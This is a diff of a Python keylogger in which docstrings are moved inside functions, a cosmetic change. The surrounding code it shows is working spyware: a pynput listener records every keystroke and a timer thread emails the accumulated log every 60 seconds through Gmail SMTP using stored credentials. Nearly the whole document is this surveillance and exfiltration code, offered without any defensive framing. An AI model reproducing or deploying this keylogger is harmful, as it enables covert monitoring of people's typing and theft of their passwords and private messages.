@@ -4,10 +4,11 @@ from pynput import keyboard
 import threading
 import smtplib 
 
-'''
-Send an email with log results of key logging
-'''
 def send_mail(email, password, msg):
+    '''
+    Send an email with log results of key logging
+    '''
+
     server = smtplib.SMTP("smtp.gmail.com", 587)
     server.starttls()
     server.login(email, password)
@@ -15,23 +16,22 @@ def send_mail(email, password, msg):
     server.quit()
 
 
-'''
-Keylogger class
-'''
 class Keylogger:
     '''
-    Constructor
+    Keylogger class
     '''
+
     def __init__(self, email, password, refresh_time=60):
         self.log = ''
         self.email = email #Gmail address
         self.password = password #Password of the mail
         self.refresh_time = refresh_time #DEFAULT: 60s=1m
 
-    '''
-    Callback called by listener in 
-    '''
     def press_key(self, key):
+        '''
+        Callback called by listener in 
+        '''
+
         #Obtain string of key inserted
         try:
             key_string = str(key.char)
@@ -45,10 +45,11 @@ class Keylogger:
         
         self.log += key_string
 
-    '''
-    Function executed by thread that periodicaly sends logged keys
-    '''
     def report(self):
+        '''
+        Function executed by thread that periodicaly sends logged keys
+        '''
+
         #Send mail with obtained log
         send_mail(self.email, self.password, self.log)
         self.log = ''
@@ -57,10 +58,11 @@ class Keylogger:
         timer = threading.Timer(self.refresh_time, self.report)
         timer.start()
 
-    '''
-    Main function
-    '''
     def start(self):
+        '''
+        Main behaviour of the keylogger
+        '''
+
         #Listener for keyboard input working in parallel with timer for printing
         with keyboard.Listener(on_press=self.press_key) as listener:
             #Send info
